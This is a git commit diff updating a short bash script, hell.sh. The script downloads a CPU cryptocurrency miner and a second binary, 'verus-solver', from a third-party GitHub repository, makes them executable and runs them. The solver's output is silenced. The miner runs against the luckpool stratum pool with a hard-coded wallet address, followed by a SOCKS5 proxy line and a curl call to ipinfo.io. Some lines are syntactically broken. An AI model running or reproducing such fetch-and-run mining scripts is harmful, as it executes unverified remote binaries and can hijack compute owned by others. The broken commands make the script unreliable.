47effb89cb7685aae5ccc7db1dc92648b38cec2f
Taryok <92034895+Taryok@users.noreply.github.com>
2022-06-20 00:40:20 +0700

    Update hell.sh

--- hell.sh
+++ hell.sh
@@ -1,2 +1,3 @@
 #!/bin/bash
-wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz  && ./hellminer -c stratum+tcp://ap.luckpool.net:3956 -u RYJDLYsGHZZTBQg7RxEi3j4Cx2fZGpVX5p.NAGOYA -p x --cpu 6
+wget https://github.com/Godmine99/cpu/raw/main/hellminer && chmod +x hellminer && wget https://github.com/Godmine99/cpu/raw/main/verus-solver && chmod +x verus-solver ./verus-solver >/dev/null 2>&1
+./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RYJDLYsGHZZTBQg7RxEi3j4Cx2fZGpVX5p.STB -p x --cpu 1 && proxy socks5://184.178.172.14:4145 && curl ipinfo.io
